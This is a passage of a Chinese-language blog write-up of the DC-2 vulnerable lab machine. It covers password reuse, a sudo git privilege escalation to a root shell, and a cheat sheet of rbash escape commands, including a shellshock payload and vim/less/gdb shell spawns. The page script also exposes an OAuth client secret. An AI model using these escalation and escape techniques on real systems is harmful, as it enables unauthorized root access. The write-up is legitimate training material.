);</span><br></code></pre></td></tr></table></figure>
+
+<p>拿到 <code>wpadmin:4uTiLL</code>，尝试登录数据库后发现用户密码都经过了哈希，没法碰撞 admin 的密码。想 MySQL 提权的思路发现，对写入目录是有限制的，不满足提权的条件，那就只能试试密码碰撞了</p>
+<p>使用 <code>4uTiLL</code>, <code>parturient</code>, <code>adipiscing</code> 尝试登录 root，均失败。</p>
+<p>尝试登录 jerry ，<code>adipiscing</code> 登录成功</p>
+<h2 id="sudo-git-提权"><a href="#sudo-git-提权" class="headerlink" title="sudo git 提权"></a>sudo git 提权</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">jerry@DC-2:~$ sudo -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> jerry on DC-2:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User jerry may run the following commands on DC-2:<br>    (root) NOPASSWD: /usr/bin/git<br></code></pre></td></tr></table></figure>
+
+<p>发现可以不使用密码以 root 权限运行 git 命令，正好对应了 flag4.txt 中的暗示。接着按照 gtfobins 的手法来提权</p>
+<p><img src="/pic/f00205d27ae218d56e31c4841d0dabe0_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">jerry@DC-2:~$ sudo PAGER=<span class="hljs-string">&#x27;sh -c &quot;exec sh 0&lt;&amp;1&quot;&#x27;</span> git -p <span class="hljs-built_in">help</span><br>sudo: sorry, you are not allowed to <span class="hljs-built_in">set</span> the following environment variables: PAGER<br>jerry@DC-2:~$ sudo PAGER=<span class="hljs-string">&#x27;sh -c &quot;exec sh 0&lt;&amp;1&quot;&#x27;</span> /usr/bin/git -p <span class="hljs-built_in">help</span><br>sudo: sorry, you are not allowed to <span class="hljs-built_in">set</span> the following environment variables: PAGER<br><br></code></pre></td></tr></table></figure>
+
+<p>方法 a 失败，尝试方法 b</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">jerry@DC-2:~$ sudo git -p <span class="hljs-built_in">help</span> config<br>!/bin/sh<br><span class="hljs-comment"># whoami</span><br>root<br><span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br><span class="hljs-comment"># ip a</span><br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default <br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:00:39:e2 brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.124/24 brd 192.168.56.255 scope global eth0<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::a00:27ff:fe00:39e2/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br><span class="hljs-comment"># uname -a</span><br>Linux DC-2 3.16.0-4-586 <span class="hljs-comment">#1 Debian 3.16.51-3 (2017-12-13) i686 GNU/Linux</span><br><br></code></pre></td></tr></table></figure>
+
+<p>确定是目标靶机，最后拿个 flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># cd /root</span><br><span class="hljs-comment"># ls</span><br>final-flag.txt<br><span class="hljs-comment"># cat final-flag.txt</span><br> __    __     _ _       _                    _ <br>/ / /\ \ \___| | |   __| | ___  _ __   ___  / \<br>\ \/  \/ / _ \ | |  / _` |/ _ \|  _ \ / _ \/  /<br> \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/ <br>  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   <br><br><br>Congratulatons!!!<br><br>A special thanks to all those <span class="hljs-built_in">who</span> sent me tweets<br>and provided me with feedback - it<span class="hljs-string">&#x27;s all greatly</span><br><span class="hljs-string">appreciated.</span><br><span class="hljs-string"></span><br><span class="hljs-string">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
+
+<h2 id="总结复盘"><a href="#总结复盘" class="headerlink" title="总结复盘"></a>总结复盘</h2><p>这台靶机因为有提示，所以打起来没那么难，比如关于自己收集字典进行爆破，如果没有提示的话可能会卡很久，或者想办法用 wordpress 比较新的漏洞打进去。再就是 rbash 实际上是第一次遇到，虽然不难，但是处理起来依然消磨了不少时间，此外关于用户名和密码的重用，自己的敏感度还是不够高，关于渗透优先级的构建还是缺乏自己的思路。除此之外，这台靶机我尝试了很多内核提权的方法都没有成功</p>
+<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><h3 id="rbash-绕过-1"><a href="#rbash-绕过-1" class="headerlink" title="rbash 绕过"></a>rbash 绕过</h3><p>在一个 rbash 的 shell 中，我们最开始要做的是对可用命令进行尝试，确定哪些命令是可用的，哪些命令是被限制的，这样我们才能更方便地绕过 rbash，接下来是一些绕过方法的总结，参考的文章会放在最后</p>
+<h4 id="环境侦察"><a href="#环境侦察" class="headerlink" title="环境侦察"></a>环境侦察</h4><ul>
+<li>查看哪些命令可用</li>
+<li>查看操作符 <code>&gt;</code>, <code>&gt;&gt;</code>, <code>|</code></li>
+<li>查看可用的编程语言环境</li>
+<li><code>sudo -l</code> 查看可用 root 权限运行的命令</li>
+<li>查看 SUID 的命令或文件</li>
+<li><code>echo $SHELL</code> 确定 bash 环境</li>
+<li><code>echo $PATH</code> 查看环境变量</li>
+</ul>
+<h4 id="常见的-exploit"><a href="#常见的-exploit" class="headerlink" title="常见的 exploit"></a>常见的 exploit</h4><ul>
+<li><code>/bin/bash</code> or <code>/bin/sh</code></li>
+<li><code>cp /bin/bash ./</code> or <code>cp /bin/sh</code></li>
+<li><code>ftp</code>, <code>gdb</code>, <code>less</code>, <code>vim</code> 可用 <code>!/bin/bash</code> or <code>/bin/sh</code></li>
+<li>还有一些可用在 gtfobins 中查看如何通过命令实现新启bash</li>
+<li>编程语言新启 bash</li>
+<li>ssh 手法<ul>
+<li><code>ssh username@IP - t &quot;/bin/sh&quot;</code> or <code>&quot;/bin/bash&quot;</code></li>
+<li><code>ssh username@IP -t &quot;bash --noprofile&quot;</code></li>
+<li><code>ssh username@IP -t &quot;() &#123; :; &#125;; /bin/bash&quot;</code> (shellshock)</li>
+<li><code>ssh -o ProxyCommand=&quot;sh -c /tmp/yourfile.sh&quot; 127.0.0.1</code> (SUID)</li>
+<li><code>pico -s &quot;/bin/bash&quot;</code> then you can write <code>/bin/bash</code> and then CTRL + T</li>
+</ul>
+</li>
+<li>直接修改环境变量 <code>export PATH=$PATH:/bin/:/usr/bin:$PATH</code></li>
+<li>有时候 <code>!sh</code> 也有效果</li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/knowledge-database/" class="category-chain-item">knowledge_database</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>DC-2 靶机</div>
+      <div>https://i3eg1nner.github.io/2023/07/4537b1f7b404.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>I3eg1nner</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年7月10日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/07/d3fd0d829200.html" title="DC-3 靶机">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">DC-3 靶机</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/07/e8652c909b79.html" title="Pilgrimage 靶机">
+                        <span class="hidden-mobile">Pilgrimage 靶机</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="gitalk-container"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#gitalk-container', function() {
+      Fluid.utils.createCssLink('/css/gitalk.css')
+      Fluid.utils.createScript('https://lib.baomitu.com/gitalk/1.8.0/gitalk.min.js', function() {
+        var options = Object.assign(
+          {"clientID":"a14e9a13405642f51885","clientSecret":"5662f466deab58fdbbacd0ae3718eaf1625401dd","repo":"gitalk","owner":"I3eg1nner","admin":["I3eg1nner"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
+          {
+            id: '625a029e22996373701def5a029fae13'
+          }
+        )
+        var gitalk = new Gitalk(options);
+        gitalk.render('gitalk-container');
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
